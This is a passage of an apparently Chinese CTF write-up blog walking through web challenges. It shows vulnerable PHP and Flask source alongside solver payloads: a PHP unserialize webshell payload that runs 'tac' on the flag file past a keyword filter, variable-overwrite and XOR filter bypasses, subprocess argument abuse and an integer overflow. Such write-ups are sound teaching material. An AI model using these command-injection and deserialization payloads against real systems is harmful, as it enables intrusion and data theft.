<span class="line"><span style="color:#d4d4d4">              </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">     } </span></span>
<span class="line"><span style="color:#d4d4d4">} </span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">check</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> !</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/[a-z]|\;|\(|\)/"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>直接异或：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156781.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221120195206916"></p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?num=</span><span style="color:#b5cea8">114514</span><span style="color:#d4d4d4">^</span><span style="color:#b5cea8">1897488</span></span></code></pre></div></div></figure><p>传参就能得到 flag 了。</p><h3 id="webshell"><a class="markdownIt-Anchor" href="#webshell"></a> webshell</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php </span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Webshell</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$cmd</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">'echo "Hello World!"'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">init</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">init</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (!</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/flag/i'</span><span style="color:#d4d4d4">, </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">cmd</span><span style="color:#d4d4d4">)) {</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">exec</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">cmd</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            }</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">exec</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$cmd</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$result</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">shell_exec</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$cmd</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$result</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'cmd'</span><span style="color:#d4d4d4">])) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$serializecmd</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'cmd'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$unserializecmd</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">unserialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$serializecmd</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$unserializecmd</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">init</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>简单的反序列化啦，真的很简单的啦。flag 过滤可用万能拼接。代码如下：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Webshell</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$cmd</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"a=g;tac fla</span><span style="color:#d7ba7d">\$</span><span style="color:#ce9178">a.php"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Webshell</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">serialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?cmd=O:</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"Webshell"</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">:{s:</span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"cmd"</span><span style="color:#d4d4d4">;s:</span><span style="color:#b5cea8">17</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"a=g;tac fla</span><span style="color:#9cdcfe">$a</span><span style="color:#ce9178">.php"</span><span style="color:#d4d4d4">;}</span></span></code></pre></div></div></figure><h3 id="化零为正"><a class="markdownIt-Anchor" href="#化零为正"></a> 化零为正</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$result</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">''</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">;</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">&lt;=</span><span style="color:#dcdcaa">count</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">);</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">++){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">strlen</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">])&gt;</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"你太长了！！"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$result</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$result</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$result</span><span style="color:#d4d4d4"> ===</span><span style="color:#ce9178">"大牛"</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这里看 else 里面：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">$result</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$result</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">];</span></span></code></pre></div></div></figure><p>也就是说输入的字符会被进行一个拼接然后赋值给 result，那么这里就可以多个传参用 &amp; 连接，如：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">=%E5&amp;</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">=%A4&amp;</span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">=%A7&amp;</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">=%E7&amp;</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">=%</span><span style="color:#b5cea8">89</span><span style="color:#d4d4d4">&amp;</span><span style="color:#b5cea8">6</span><span style="color:#d4d4d4">=%</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">B</span></span></code></pre></div></div></figure><p>这样就能得到 flag 了。在 url 编码里面 % xx 算作一个解码点，也就是一个字符。</p><h3 id="传说之下雾"><a class="markdownIt-Anchor" href="#传说之下雾"></a> 传说之下（雾）</h3><p>是个小游戏	<s>欢迎来到夜之城</s></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156528.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221120204025568"></p><p>边抓包边玩看看。发现没有通过包进行传数据，只能进行代码审计了。</p><p>代码审计，找到关键类：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156757.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221120211900715"></p><p>直接修改 js 是不行的。这里可以看到 Game 是这个关键类的实例，直接到控制台冲它：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156877.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221120212129242"></p><p>双击 score 的值进行修改即可。</p><h3 id="easypython_prequestformget传参点subprocess"><a class="markdownIt-Anchor" href="#easypython_prequestformget传参点subprocess"></a> easyPytHon_P（request.form.get 传参点 + subprocess）</h3><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#c586c0">from</span><span style="color:#d4d4d4"> flask </span><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> request</span></span>
<span class="line"><span style="color:#d4d4d4">cmd: </span><span style="color:#4ec9b0">str</span><span style="color:#d4d4d4"> = request.form.get(</span><span style="color:#ce9178">'cmd'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">param: </span><span style="color:#4ec9b0">str</span><span style="color:#d4d4d4"> = request.form.get(</span><span style="color:#ce9178">'param'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#6a9955"># ------------------------------------- Don't modify ↑ them ↑! But you can write your code ↓</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> subprocess, os</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> cmd </span><span style="color:#569cd6">is</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">not</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">None</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">and</span><span style="color:#d4d4d4"> param </span><span style="color:#569cd6">is</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">not</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">None</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">try</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">        tVar = subprocess.run([cmd[:</span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">], param, </span><span style="color:#9cdcfe">__file__</span><span style="color:#d4d4d4">], </span><span style="color:#9cdcfe">cwd</span><span style="color:#d4d4d4">=os.getcwd(), </span><span style="color:#9cdcfe">timeout</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'Done!'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">except</span><span style="color:#d4d4d4"> subprocess.TimeoutExpired:</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'Timeout!'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">except</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'Error!'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#c586c0">else</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'No Flag!'</span><span style="color:#d4d4d4">)</span></span></code></pre></div></div></figure><p>参考：[Request.Form.Get () Request.Form Request<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fighting-mochou/archive/2012/12/12/2815555.html">] 区别</a></p><p>这里的 cmd 和 param 都是 post 传参。主要是对这一句话的理解：</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">tVar = subprocess.run([cmd[:</span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">], param, </span><span style="color:#9cdcfe">__file__</span><span style="color:#d4d4d4">], </span><span style="color:#9cdcfe">cwd</span><span style="color:#d4d4d4">=os.getcwd(), </span><span style="color:#9cdcfe">timeout</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">)</span></span></code></pre></div></div></figure><p>这里命令执行函数的参数中有 cmd [:3] 说明只能写三个字符之内的命令，第二个参数可以写文件名或者路径：</p><p>参考官方文档：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/python3-subprocess.html">Python3 subprocess</a></p><p>于是可以先查看当前目录有什么：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">post：cmd=ls</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">param=</span><span style="color:#d4d4d4">.</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211251922522.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221125192204407"></p><p>tac 这个 flag 就可以了：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">post：cmd=tac</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">param=flag</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">txt</span></span></code></pre></div></div></figure><h3 id="遍地飘零变量覆盖"><a class="markdownIt-Anchor" href="#遍地飘零变量覆盖"></a> 遍地飘零（变量覆盖）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$zeros</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"000000000000000000000000000000"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">foreach</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4"> as </span><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4"> =&gt; </span><span style="color:#9cdcfe">$value</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$$key</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$$value</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">==</span><span style="color:#ce9178">"000000000000000000000000000000"</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"好多零"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"没有零，仔细看看输入有什么问题吧"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">var_dump</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">没有零，仔细看看输入有什么问题吧array</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">) { }</span></span></code></pre></div></div></figure><p>var_dump 里面打印的是 $_GET，所以我们要覆盖的点也很清楚了：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?_GET=flag</span></span></code></pre></div></div></figure><h3 id="茶歇区整数溢出"><a class="markdownIt-Anchor" href="#茶歇区整数溢出"></a> 茶歇区（整数溢出）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">a=</span><span style="color:#b5cea8">0</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">b=</span><span style="color:#b5cea8">0</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">c=</span><span style="color:#b5cea8">0</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">d=</span><span style="color:#b5cea8">0</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">e=</span><span style="color:#b5cea8">999999999999999999</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">submit=%E5%</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">D%B7%E4%BA%</span><span style="color:#b5cea8">86</span><span style="color:#d4d4d4">%E5%B0%B1%E8%B7%</span><span style="color:#b5cea8">91</span><span style="color:#d4d4d4">%EF%BC%</span><span style="color:#b5cea8">81</span></span></code></pre></div></div></figure><p>可以用重发器试，在 e 后面加 9 的个数发出直到说拿到了分，不用在意是正是负，看到这个提示之后再发就能拿到了。</p><h3 id="lsb探姬代码审计抓包修改"><a class="markdownIt-Anchor" href="#lsb探姬代码审计抓包修改"></a> LSB 探姬（代码审计抓包修改）</h3><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># !/usr/bin/env python</span></span>
<span class="line"><span style="color:#6a9955"># -*-coding:utf-8 -*-</span></span>
<span class="line"><span style="color:#ce9178">"""</span></span>
<span class="line"><span style="color:#ce9178"># File       : app.py</span></span>
<span class="line"><span style="color:#ce9178"># Time       ：2022/10/20 15:16</span></span>
<span class="line"><span style="color:#ce9178"># Author     ：g4_simon</span></span>
<span class="line"><span style="color:#ce9178"># version    ：python 3.9.7</span></span>
<span class="line"><span style="color:#ce9178"># Description：TSTEG-WEB</span></span>
<span class="line"><span style="color:#ce9178"># flag is in /app/flag.py</span></span>
<span class="line"><span style="color:#ce9178">"""</span></span>
<span class="line"><span style="color:#c586c0">from</span><span style="color:#d4d4d4"> flask </span><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> *</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> os</span></span>
<span class="line"><span style="color:#6a9955">#初始化全局变量</span></span>
<span class="line"><span style="color:#d4d4d4">app = Flask(</span><span style="color:#9cdcfe">__name__</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">@app.route</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">methods</span><span style="color:#d4d4d4">=[</span><span style="color:#ce9178">'GET'</span><span style="color:#d4d4d4">])</span></span>
<span class="line"><span style="color:#569cd6">def</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">index</span><span style="color:#d4d4d4">():    </span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> render_template(</span><span style="color:#ce9178">'upload.html'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">@app.route</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'/upload'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">methods</span><span style="color:#d4d4d4">=[</span><span style="color:#ce9178">'GET'</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">'POST'</span><span style="color:#d4d4d4">])</span></span>
<span class="line"><span style="color:#569cd6">def</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">upload_file</span><span style="color:#d4d4d4">():</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> request.method == </span><span style="color:#ce9178">'POST'</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">try</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">            f = request.files[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">]</span></span>
<span class="line"><span style="color:#d4d4d4">            f.save(</span><span style="color:#ce9178">'upload/'</span><span style="color:#d4d4d4">+f.filename)</span></span>
